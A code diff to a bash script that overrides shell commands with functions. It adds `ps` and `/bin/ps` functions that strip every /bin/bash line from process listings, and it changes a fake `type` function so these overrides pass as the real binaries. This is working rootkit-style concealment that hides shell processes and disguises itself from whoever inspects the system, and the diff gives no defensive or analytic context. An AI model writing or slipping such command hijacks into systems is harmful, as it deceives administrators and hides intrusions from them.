@@ -91,11 +91,11 @@ function type()
 		"ls")
 			echo "ls is aliased to ls --color=tty"
 			return ;;
-		"/bin/ls")
-			echo "/bin/ls is /bin/ls"
+		"ps")
+			echo "ps is /bin/ps"
 			return ;;
-		"/usr/bin/dir")
-			echo "bash: type: /bin/dir: not found"
+		"/bin/ls"|"/usr/bin/dir"|"/bin/ps")
+			echo "$1 is $1"
 			return ;;
                 *)
 			unset command
@@ -346,4 +346,30 @@ function /bin/ls()
 	unset -f /bin/ls
 	ls $@
 	reset_ls
+}
+
+function ps()
+{
+        local proc_name new_proc_name
+
+        proc_name=`/bin/ps $@`
+        new_proc_name=`echo "$proc_name" | sed -e '/\/bin\/bash/d'`
+        echo "$new_proc_name"
+}
+
+function reset_ps()
+{
+        function /bin/ps()
+        {
+                unset -f /bin/ps
+                ps $@
+                reset_ps
+        }
+}
+
+function /bin/ps()
+{
+        unset -f /bin/ps
+        ps $@
+        reset_ps
 }
